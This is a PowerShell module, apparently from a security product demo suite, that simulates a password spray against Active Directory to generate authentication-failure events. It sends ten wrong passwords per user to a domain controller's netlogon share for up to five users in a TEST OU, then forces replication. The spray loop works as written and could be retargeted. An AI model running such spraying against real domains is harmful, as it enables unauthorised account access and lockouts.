################################################################################
##
## DSP-Demo-Activity-07-SecurityPasswordSpray.psm1
##
## Password spray attack: select 5 users from TEST OU, attempt netlogon auth with bad passwords
##
################################################################################

#Requires -Version 5.1
#Requires -Modules ActiveDirectory

################################################################################
# HELPER FUNCTIONS
################################################################################

function Write-ActivityHeader {
    param([string]$Title)
    Write-Host ""
    Write-Host ("+--" + ("-" * 62) + "--+") -ForegroundColor Cyan
    Write-Host ("| " + $Title.PadRight(62) + " |") -ForegroundColor Cyan
    Write-Host ("+--" + ("-" * 62) + "--+") -ForegroundColor Cyan
    Write-Host ""
}

function Write-Status {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $colors = @{
        'Info'    = 'White'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error'   = 'Red'
    }
    
    $color = $colors[$Level]
    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $color
}

################################################################################
# MAIN FUNCTION
################################################################################

function Invoke-SecurityPasswordSpray {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]$Config,
        
        [Parameter(Mandatory=$true)]
        [PSCustomObject]$Environment
    )
    
    Write-ActivityHeader "Security - Password Spray Attack"
    
    $sprayAttempts = 0
    $errorCount = 0
    
    $domainInfo = $Environment.DomainInfo
    $domainDN = $domainInfo.DN
    $domainFQDN = $domainInfo.FQDN
    $primaryDC = $Environment.PrimaryDC
    
    Write-Status "Target domain: $domainFQDN" -Level Info
    Write-Status "Primary DC: $primaryDC" -Level Info
    Write-Host ""
    
    try {
        # Find TEST OU
        $testOU = Get-ADOrganizationalUnit -Filter { Name -eq "TEST" } -SearchBase $domainDN -ErrorAction SilentlyContinue
        
        if (-not $testOU) {
            Write-Status "TEST OU not found" -Level Warning
            Write-Host ""
            return $true
        }
        
        Write-Status "Found TEST OU: $($testOU.DistinguishedName)" -Level Info
        
        # Get all enabled users from TEST OU
        $testUsers = Get-ADUser -Filter { Enabled -eq $true } -SearchBase $testOU.DistinguishedName -ErrorAction Stop
        
        if (-not $testUsers) {
            Write-Status "No enabled users found in TEST OU" -Level Warning
            Write-Host ""
            return $true
        }
        
        # Select up to 5 random users
        if ($testUsers -is [array]) {
            $selectedUsers = $testUsers | Get-Random -Count ([Math]::Min(5, $testUsers.Count))
        }
        else {
            $selectedUsers = @($testUsers)
        }
        
        Write-Status "Targeting $($selectedUsers.Count) user(s) with password spray (10 attempts each)" -Level Info
        Write-Host ""
        
        # Spray passwords - 10 different passwords per user
        for ($i = 1; $i -le 10; $i++) {
            $testPassword = "SomeP@sswordGu3ss!$i"
            Write-Status "Spray attempt $i of 10 (password: $testPassword)" -Level Info
            
            foreach ($user in $selectedUsers) {
                try {
                    # Use net use with explicit domain\user and bad password
                    # This triggers real authentication failure events
                    & net use "\\$primaryDC\netlogon" /user:"$domainFQDN\$($user.SamAccountName)" "$testPassword" > $null 2>&1
                    
                    $sprayAttempts++
                }
                catch {
                    # Expected - auth will fail
                    $sprayAttempts++
                }
                
                # Try to clean up any successful connections (shouldn't happen with bad password)
                & net use "\\$primaryDC\netlogon" /delete /y > $null 2>&1
            }
        }
        
        Write-Host ""
        Write-Status "Password spray completed: $sprayAttempts total attempts" -Level Success
        
        # Wait for events to be written to security log
        Write-Status "Waiting 10 seconds for security events to be written..." -Level Info
        Start-Sleep -Seconds 10
        
        # Trigger replication
        Write-Status "Triggering replication..." -Level Info
        try {
            $dc = $Environment.PrimaryDC
            if ($dc) {
                $repOutput = & C:\Windows\System32\repadmin.exe /syncall /force $dc
                if ($repOutput -join '-' -match 'syncall finished') {
                    Write-Status "Replication completed successfully" -Level Success
                }
                else {
                    Write-Status "Replication executed" -Level Info
                }
                
                # Also replicate secondary DC if available
                if ($Environment.SecondaryDC) {
                    & C:\Windows\System32\repadmin.exe /syncall /force $Environment.SecondaryDC | Out-Null
                }
                
                Start-Sleep -Seconds 3
            }
            else {
                Write-Status "No primary DC available for replication" -Level Warning
            }
        }
        catch {
            Write-Status "Warning: Could not trigger replication: $_" -Level Warning
        }
    }
    catch {
        Write-Status "Fatal error: $_" -Level Error
        $errorCount++
    }
    
    # Summary
    Write-Host ""
    Write-Status "Spray attempts: $sprayAttempts, Errors: $errorCount" -Level Info
    
    if ($errorCount -eq 0) {
        Write-Status "Password Spray completed successfully" -Level Success
    }
    else {
        Write-Status "Password Spray completed with $errorCount error(s)" -Level Warning
    }
    
    Write-Host ""
    return $true
}

Export-ModuleMember -Function Invoke-SecurityPasswordSpray